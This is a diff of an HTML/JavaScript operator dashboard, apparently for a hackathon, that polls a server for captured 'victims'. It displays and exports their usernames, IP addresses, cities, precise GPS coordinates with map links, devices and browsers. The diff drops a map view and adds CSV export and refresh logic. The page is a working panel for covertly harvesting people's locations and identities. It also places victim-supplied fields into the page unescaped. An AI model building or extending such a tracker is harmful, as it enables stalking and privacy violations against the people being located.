@@ -4,24 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>APEX Dashboard - Análisis de Seguridad</title>
-    
-    <!-- Leaflet CSS (alternativa gratuita a Google Maps) -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    
+
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #0a0e27;
             color: #e0e0e0;
             padding: 20px;
         }
-        
+
         .header {
             text-align: center;
             margin-bottom: 30px;
@@ -31,15 +28,21 @@
             border: 2px solid #00ff88;
             box-shadow: 0 0 30px rgba(0,255,136,0.2);
         }
-        
+
         .header h1 {
             font-size: 48px;
             background: linear-gradient(135deg, #00ff88, #00d4ff);
             -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 10px;
         }
-        
+
+        .header p {
+            color: #888;
+            font-size: 16px;
+        }
+
         .controls {
             margin-bottom: 25px;
             display: flex;
@@ -47,7 +50,7 @@
             flex-wrap: wrap;
             justify-content: center;
         }
-        
+
         button {
             background: linear-gradient(135deg, #00ff88, #00d4ff);
             color: #0a0e27;
@@ -58,24 +61,29 @@
             font-weight: bold;
             font-size: 15px;
             transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
         }
-        
+
         button:hover {
             transform: translateY(-2px);
             box-shadow: 0 6px 20px rgba(0,255,136,0.5);
         }
-        
+
         button.danger {
             background: linear-gradient(135deg, #ff3333, #ff6b6b);
         }
-        
+
+        button.secondary {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+        }
+
         .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
             gap: 20px;
             margin-bottom: 30px;
         }
-        
+
         .stat-card {
             background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
             padding: 25px;
@@ -84,71 +92,29 @@
             text-align: center;
             transition: all 0.3s;
         }
-        
+
         .stat-card:hover {
             transform: translateY(-5px);
             border-color: #00ff88;
             box-shadow: 0 8px 25px rgba(0,255,136,0.3);
         }
-        
+
         .stat-card h3 {
             font-size: 14px;
             color: #00ff88;
             margin-bottom: 15px;
             text-transform: uppercase;
         }
-        
+
         .stat-card .number {
             font-size: 36px;
             font-weight: bold;
-            color: #00d4ff;
+            background: linear-gradient(135deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        
-        /* MAPA */
-        .map-container {
-            background: #1a1f3a;
-            padding: 20px;
-            border-radius: 12px;
-            border: 1px solid #00ff88;
-            margin-bottom: 30px;
-        }
-        
-        .map-container h2 {
-            color: #00ff88;
-            margin-bottom: 15px;
-            font-size: 24px;
-        }
-        
-        #map {
-            height: 500px;
-            border-radius: 8px;
-            border: 2px solid #00d4ff;
-        }
-        
-        .map-legend {
-            margin-top: 15px;
-            padding: 10px;
-            background: #0a0e27;
-            border-radius: 5px;
-            font-size: 13px;
-        }
-        
-        .legend-item {
-            display: inline-block;
-            margin-right: 20px;
-        }
-        
-        .legend-dot {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-right: 5px;
-        }
-        
-        .legend-dot.ip { background: #ff6b6b; }
-        .legend-dot.gps { background: #00ff88; }
-        
+
         /* TABLA */
         .victims-table {
             background: #1a1f3a;
@@ -157,25 +123,25 @@
             border: 1px solid #00ff88;
             overflow-x: auto;
         }
-        
+
         .victims-table h2 {
             margin-bottom: 20px;
             font-size: 28px;
             color: #00ff88;
         }
-        
+
         table {
             width: 100%;
             border-collapse: collapse;
             font-size: 14px;
         }
-        
+
         th, td {
             padding: 14px;
             text-align: left;
             border-bottom: 1px solid #333;
         }
-        
+
         th {
             background: #0a0e27;
             color: #00ff88;
@@ -183,11 +149,11 @@
             text-transform: uppercase;
             font-size: 12px;
         }
-        
+
         tr:hover {
             background: #2a2f4a;
         }
-        
+
         .location-badge {
             display: inline-block;
             padding: 3px 8px;
@@ -195,34 +161,34 @@
             font-size: 11px;
             font-weight: bold;
         }
-        
+
         .location-ip {
             background: #ff6b6b44;
             color: #ff6b6b;
         }
-        
+
         .location-gps {
             background: #00ff8844;
             color: #00ff88;
         }
-        
+
         .coords-link {
             color: #00d4ff;
             text-decoration: none;
             cursor: pointer;
         }
-        
+
         .coords-link:hover {
             text-decoration: underline;
         }
-        
+
         .loading {
             text-align: center;
             padding: 60px;
             font-size: 20px;
             color: #888;
         }
-        
+
         .spinner {
             border: 4px solid rgba(0,255,136,0.3);
             border-top: 4px solid #00ff88;
@@ -232,7 +198,7 @@
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -244,14 +210,14 @@
         <h1>🎯 APEX DASHBOARD</h1>
         <p>Sistema de Análisis de Seguridad - Hackathon 2025</p>
     </div>
-    
+
     <div class="controls">
         <button onclick="loadData()">🔄 Actualizar</button>
         <button onclick="clearData()" class="danger">🗑️ Limpiar Datos</button>
-        <button onclick="exportData()">💾 Exportar JSON</button>
-        <button onclick="toggleMapView()">🗺️ Alternar Vista</button>
+        <button onclick="exportData()" class="secondary">💾 Exportar JSON</button>
+        <button onclick="exportCSV()" class="secondary">📊 Exportar CSV</button>
     </div>
-    
+
     <div class="stats">
         <div class="stat-card">
             <h3>Víctimas Totales</h3>
@@ -270,23 +236,7 @@
             <div class="number" id="lastCapture" style="font-size: 16px;">-</div>
         </div>
     </div>
-    
-    <!-- MAPA INTERACTIVO -->
-    <div class="map-container" id="mapContainer">
-        <h2>🗺️ Mapa de Ubicaciones</h2>
-        <div id="map"></div>
-        <div class="map-legend">
-            <span class="legend-item">
-                <span class="legend-dot ip"></span>
-                <span>Ubicación por IP (aproximada)</span>
-            </span>
-            <span class="legend-item">
-                <span class="legend-dot gps"></span>
-                <span>Ubicación GPS (precisa)</span>
-            </span>
-        </div>
-    </div>
-    
+
     <!-- TABLA DE VÍCTIMAS -->
     <div class="victims-table">
         <h2>📋 Registro de Víctimas</h2>
@@ -296,244 +246,115 @@
         </div>
     </div>
 
-    <!-- Leaflet JS -->
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    
     <script>
-        let map;
-        let markers = [];
-        let mapVisible = true;
-        
-        // Inicializar mapa
-        function initMap() {
-            if (map) {
-                map.remove();
-            }
-            
-            // Crear mapa centrado en el mundo
-            map = L.map('map').setView([20, 0], 2);
-            
-            // Añadir tiles (OpenStreetMap - gratis)
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '© OpenStreetMap',
-                maxZoom: 19
-            }).addTo(map);
-        }
-        
-        // Agregar marcador al mapa
-        function addMarker(lat, lon, info, isGPS) {
-            const color = isGPS ? '#00ff88' : '#ff6b6b';
-            const icon = L.divIcon({
-                className: 'custom-marker',
-                html: `<div style="background: ${color}; width: 20px; height: 20px; border-radius: 50%; border: 3px solid white; box-shadow: 0 0 10px ${color};"></div>`,
-                iconSize: [20, 20]
-            });
-            
-            const marker = L.marker([lat, lon], { icon: icon }).addTo(map);
-            
-            const popupContent = `
-                <div style="color: #000; font-size: 13px;">
-                    <strong>${info.username || 'Visitor'}</strong><br>
-                    <strong>IP:</strong> ${info.ip}<br>
-                    <strong>Ubicación:</strong> ${info.city}, ${info.country}<br>
-                    <strong>Tipo:</strong> ${isGPS ? '🎯 GPS Preciso' : '📍 IP Aproximado'}<br>
-                    ${isGPS ? `<strong>Coords:</strong> ${lat.toFixed(4)}, ${lon.toFixed(4)}<br>` : ''}
-                    <strong>Dispositivo:</strong> ${info.device}<br>
-                    <strong>Hora:</strong> ${new Date(info.timestamp).toLocaleString('es-MX')}<br>
-                    ${isGPS ? '<br><a href="https://www.google.com/maps?q=' + lat + ',' + lon + '" target="_blank" style="color: #00d4ff;">Ver en Google Maps</a>' : ''}
-                </div>
-            `;
-            
-            marker.bindPopup(popupContent);
-            markers.push(marker);
-            
-            return marker;
-        }
-        
-        // Limpiar marcadores
-        function clearMarkers() {
-            markers.forEach(marker => marker.remove());
-            markers = [];
-        }
-        
-        // Alternar vista del mapa
-        function toggleMapView() {
-            const mapContainer = document.getElementById('mapContainer');
-            mapVisible = !mapVisible;
-            mapContainer.style.display = mapVisible ? 'block' : 'none';
-        }
-        
+        let victimsData = [];
+        let lastDataHash = '';
+
         // Cargar datos
         async function loadData() {
             try {
                 const response = await fetch('/api/victims');
-                const victims = await response.json();
-                
-                // Actualizar estadísticas
-                document.getElementById('totalVictims').textContent = victims.length;
-                
-                const uniqueCountries = [...new Set(victims.map(v => v.network?.country || 'Unknown'))];
-                document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
-                
-                const gpsCount = victims.filter(v => v.geolocation?.latitude).length;
-                document.getElementById('gpsLocations').textContent = gpsCount;
-                
-                if (victims.length > 0) {
-                    const lastVictim = victims[victims.length - 1];
-                    const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
-                    document.getElementById('lastCapture').textContent = timeAgo;
-                }
-                
-                // Limpiar mapa
-                clearMarkers();
-                
-                // Agregar marcadores al mapa
-                victims.forEach(victim => {
-                    // Si tiene geolocalización GPS precisa
-                    if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
-                        addMarker(
-                            victim.geolocation.latitude,
-                            victim.geolocation.longitude,
-                            {
-                                username: victim.username,
-                                ip: victim.network?.ip || 'Unknown',
-                                city: victim.network?.city || 'Unknown',
-                                country: victim.network?.country || 'Unknown',
-                                device: `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`,
-                                timestamp: victim.timestamp
-                            },
-                            true // es GPS
-                        );
-                    }
-                    // Si solo tiene ubicación por IP (usar geoip-lite)
-                    else if (victim.network?.city !== 'Unknown') {
-                        // Necesitamos obtener coords aproximadas de la ciudad
-                        // Por ahora usaremos coordenadas de ejemplo basadas en la IP
-                        const ipCoords = getApproxCoordsFromGeoIP(victim);
-                        if (ipCoords) {
-                            addMarker(
-                                ipCoords.lat,
-                                ipCoords.lon,
-                                {
-                                    username: victim.username,
-                                    ip: victim.network?.ip || 'Unknown',
-                                    city: victim.network?.city || 'Unknown',
-                                    country: victim.network?.country || 'Unknown',
-                                    device: `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`,
-                                    timestamp: victim.timestamp
-                                },
-                                false // no es GPS, es IP
-                            );
-                        }
-                    }
-                });
-                
-                // Ajustar vista del mapa para mostrar todos los marcadores
-                if (markers.length > 0) {
-                    const group = L.featureGroup(markers);
-                    map.fitBounds(group.getBounds().pad(0.1));
-                }
-                
-                // Crear tabla
-                if (victims.length === 0) {
-                    document.getElementById('tableContainer').innerHTML = 
-                        '<p class="loading">No hay víctimas capturadas aún.</p>';
+                const newData = await response.json();
+
+                // Crear hash simple de los datos para detectar cambios
+                const newHash = JSON.stringify(newData);
+
+                // Solo actualizar si los datos cambiaron
+                if (newHash !== lastDataHash) {
+                    victimsData = newData;
+                    lastDataHash = newHash;
+
+                    updateStats();
+                    renderTable();
                 } else {
-                    let tableHTML = `
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>#</th>
-                                    <th>Usuario</th>
-                                    <th>IP</th>
-                                    <th>Ubicación</th>
-                                    <th>Coordenadas</th>
-                                    <th>Dispositivo</th>
-                                    <th>Navegador</th>
-                                    <th>Fecha</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                    `;
-                    
-                    victims.reverse().forEach((victim, index) => {
-                        const hasGPS = victim.geolocation?.latitude && victim.geolocation?.longitude;
-                        const locationBadge = hasGPS 
-                            ? '<span class="location-badge location-gps">GPS</span>'
-                            : '<span class="location-badge location-ip">IP</span>';
-                        
-                        let coordsHTML = 'N/A';
-                        if (hasGPS) {
-                            const lat = victim.geolocation.latitude.toFixed(4);
-                            const lon = victim.geolocation.longitude.toFixed(4);
-                            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                            coordsHTML = `<a href="${googleMapsUrl}" target="_blank" class="coords-link">${lat}, ${lon}</a>`;
-                        } else {
-                            const ipCoords = getApproxCoordsFromGeoIP(victim);
-                            if (ipCoords) {
-                                const googleMapsUrl = `https://www.google.com/maps?q=${ipCoords.lat},${ipCoords.lon}`;
-                                coordsHTML = `<a href="${googleMapsUrl}" target="_blank" class="coords-link">~${ipCoords.lat.toFixed(2)}, ${ipCoords.lon.toFixed(2)}</a>`;
-                            }
-                        }
-                        
-                        const browser = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`;
-                        const device = `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`;
-                        const date = new Date(victim.timestamp).toLocaleString('es-MX');
-                        
-                        tableHTML += `
-                            <tr>
-                                <td>${victims.length - index}</td>
-                                <td><strong>${victim.username || 'Visitor'}</strong></td>
-                                <td>${victim.network?.ip || 'Unknown'}</td>
-                                <td>${locationBadge} ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}</td>
-                                <td>${coordsHTML}</td>
-                                <td>${device}</td>
-                                <td>${browser}</td>
-                                <td>${date}</td>
-                            </tr>
-                        `;
-                    });
-                    
-                    tableHTML += '</tbody></table>';
-                    document.getElementById('tableContainer').innerHTML = tableHTML;
+                    // Solo actualizar estadísticas (tiempo relativo)
+                    updateStats();
                 }
-                
+
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('tableContainer').innerHTML = 
+                document.getElementById('tableContainer').innerHTML =
                     '<p class="loading">❌ Error al cargar datos</p>';
             }
         }
-        
-        // Obtener coordenadas aproximadas desde geoip
-        function getApproxCoordsFromGeoIP(victim) {
-            // Primero intentar usar las coordenadas que vienen del backend (geoip-lite)
-            if (victim.network?.latitude && victim.network?.longitude) {
-                return {
-                    lat: victim.network.latitude,
-                    lon: victim.network.longitude
-                };
+
+        function updateStats() {
+            document.getElementById('totalVictims').textContent = victimsData.length;
+
+            const uniqueCountries = [...new Set(victimsData.map(v => v.network?.country || 'Unknown'))];
+            document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
+
+            const gpsCount = victimsData.filter(v => v.geolocation?.latitude).length;
+            document.getElementById('gpsLocations').textContent = gpsCount;
+
+            if (victimsData.length > 0) {
+                const lastVictim = victimsData[victimsData.length - 1];
+                const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
+                document.getElementById('lastCapture').textContent = timeAgo;
             }
-            
-            // Fallback: coordenadas conocidas de ciudades
-            const cityCoords = {
-                'Juárez': { lat: 31.6904, lon: -106.4245 },
-                'Ciudad Juárez': { lat: 31.6904, lon: -106.4245 },
-                'Mexico City': { lat: 19.4326, lon: -99.1332 },
-                'Monterrey': { lat: 25.6866, lon: -100.3161 },
-                'Guadalajara': { lat: 20.6597, lon: -103.3496 },
-                'Tijuana': { lat: 32.5149, lon: -117.0382 },
-                'Chihuahua': { lat: 28.6353, lon: -106.0889 }
-            };
-            
-            const city = victim.network?.city;
-            if (city && cityCoords[city]) {
-                return cityCoords[city];
-            }
-            
-            return null;
         }
-        
+
+        function renderTable() {
+            if (victimsData.length === 0) {
+                document.getElementById('tableContainer').innerHTML =
+                    '<p class="loading">No hay víctimas capturadas aún.</p>';
+                return;
+            }
+
+            let tableHTML = `
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Usuario</th>
+                            <th>IP</th>
+                            <th>Ubicación</th>
+                            <th>Coordenadas</th>
+                            <th>Dispositivo</th>
+                            <th>Navegador</th>
+                            <th>Fecha</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            const reversedVictims = [...victimsData].reverse();
+            reversedVictims.forEach((victim, index) => {
+                const hasGPS = victim.geolocation?.latitude && victim.geolocation?.longitude;
+                const locationBadge = hasGPS
+                    ? '<span class="location-badge location-gps">GPS</span>'
+                    : '<span class="location-badge location-ip">IP</span>';
+
+                let coordsHTML = 'N/A';
+                if (hasGPS) {
+                    const lat = victim.geolocation.latitude.toFixed(4);
+                    const lon = victim.geolocation.longitude.toFixed(4);
+                    const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    coordsHTML = `<a href="${googleMapsUrl}" target="_blank" class="coords-link">${lat}, ${lon}</a>`;
+                }
+
+                const browser = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`;
+                const device = `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`;
+                const date = new Date(victim.timestamp).toLocaleString('es-MX');
+
+                tableHTML += `
+                    <tr>
+                        <td>${victimsData.length - index}</td>
+                        <td><strong>${victim.username || 'Visitor'}</strong></td>
+                        <td>${victim.network?.ip || 'Unknown'}</td>
+                        <td>${locationBadge} ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}</td>
+                        <td>${coordsHTML}</td>
+                        <td>${device}</td>
+                        <td>${browser}</td>
+                        <td>${date}</td>
+                    </tr>
+                `;
+            });
+
+            tableHTML += '</tbody></table>';
+            document.getElementById('tableContainer').innerHTML = tableHTML;
+        }
+
         function getTimeAgo(date) {
             const seconds = Math.floor((new Date() - date) / 1000);
             if (seconds < 60) return 'Hace ' + seconds + ' seg';
@@ -541,7 +362,7 @@
             if (seconds < 86400) return 'Hace ' + Math.floor(seconds / 3600) + ' hrs';
             return 'Hace ' + Math.floor(seconds / 86400) + ' días';
         }
-        
+
         async function clearData() {
             if (confirm('¿Seguro que quieres eliminar TODOS los datos?')) {
                 try {
@@ -553,29 +374,47 @@
                 }
             }
         }
-        
+
         async function exportData() {
             try {
-                const response = await fetch('/api/victims');
-                const victims = await response.json();
-                
-                const dataStr = JSON.stringify(victims, null, 2);
+                const dataStr = JSON.stringify(victimsData, null, 2);
                 const dataBlob = new Blob([dataStr], { type: 'application/json' });
-                
+
                 const url = URL.createObjectURL(dataBlob);
                 const link = document.createElement('a');
                 link.href = url;
                 link.download = `victims_${new Date().toISOString()}.json`;
                 link.click();
+                URL.revokeObjectURL(url);
             } catch (error) {
                 alert('❌ Error al exportar');
             }
         }
-        
+
+        async function exportCSV() {
+            try {
+                let csv = 'Timestamp,Username,IP,Country,City,Latitude,Longitude,Device,OS,Browser\n';
+                victimsData.forEach(v => {
+                    const lat = v.geolocation?.latitude || '';
+                    const lon = v.geolocation?.longitude || '';
+                    csv += `"${v.timestamp}","${v.username || 'N/A'}","${v.network?.ip || ''}","${v.network?.country || ''}","${v.network?.city || ''}","${lat}","${lon}","${v.device?.type || ''}","${v.os?.name || ''}","${v.browser?.name || ''}"\n`;
+                });
+
+                const blob = new Blob([csv], { type: 'text/csv' });
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = `victims_${new Date().toISOString()}.csv`;
+                link.click();
+                URL.revokeObjectURL(url);
+            } catch (error) {
+                alert('❌ Error al exportar CSV');
+            }
+        }
+
         // Inicializar
-        initMap();
         loadData();
-        
+
         // Auto-refresh cada 5 segundos
         setInterval(loadData, 5000);
     </script>
